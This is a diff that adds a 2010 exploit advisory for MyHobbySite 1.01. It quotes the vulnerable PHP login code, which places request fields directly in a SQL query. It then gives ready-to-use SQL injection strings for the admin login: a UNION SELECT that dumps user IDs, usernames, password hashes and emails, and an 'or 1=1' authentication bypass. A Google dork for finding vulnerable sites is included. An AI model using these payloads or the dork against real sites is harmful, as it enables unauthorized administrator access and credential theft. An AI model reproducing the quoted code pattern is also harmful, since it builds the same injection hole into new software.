@@ -1,0 +1,46 @@
+#########################################################################################
+# Exploit Title: MyHobbySite 1.01 SQL injection, Bypass Authentication Vulnerability
+# Date: 12-09-2010
+# Author: YuGj VN
+# Email: anhtuanittn.vn@gmail.com
+# Software Link: http://www.myhobbysite.net/index.php?page=15
+# Version: v1.01
+#########################################################################################
+
+Bug Code:
+if (isset($_REQUEST['username']) and isset($_REQUEST['password'])) {
+	// Get user info from the dataabse
+	$_REQUEST['username'] = trim($_REQUEST['username']);
+	$_REQUEST['password'] = trim($_REQUEST['password']);
+	$usersettings = @mysql_query("SELECT * FROM " . $CONFIG['database_table_prefix'] . "users WHERE username='$_REQUEST[username]' AND password=md5('$_REQUEST[password]')");
+	$usersettings = mysql_fetch_array($usersettings);
+	if ($usersettings) {
+		$_SESSION['logged_in'] = TRUE;
+		$_SESSION['userid'] = $usersettings['id'];
+		$_SESSION['user'] = $usersettings['username'];
+		$_SESSION['pass'] = $usersettings['password'];
+		$_SESSION['email'] = $usersettings['email'];
+		$_SESSION['permissions'] = $usersettings['permissions'];
+		UpdateLogs($usersettings['username'] . " logged into the Admin CP.");
+	} else {
+		$failed_login = TRUE;
+	}
+}
+
+#########################################################################################
+
+Exploit:
+
+link exploit:  http://domain.com/admin/
+# Enter in username field: ' union select 1,concat_ws(0x3a,id,username,password,email),3,4,5 from mhs_users-- -
+# Enter in password field: ' union select 1,concat_ws(0x3a,id,username,password,email),3,4,5 from mhs_users-- -
+# or
+# Enter in username field: ' or 1=1-- -
+# Enter in password field: ' or 1=1-- -
+# 
+#
+# We can exploit only when magic_quote_gpc = Off
+# Google dork: Powered by MyHobbySite 1.01
+# 
+#
+#########################################################################################
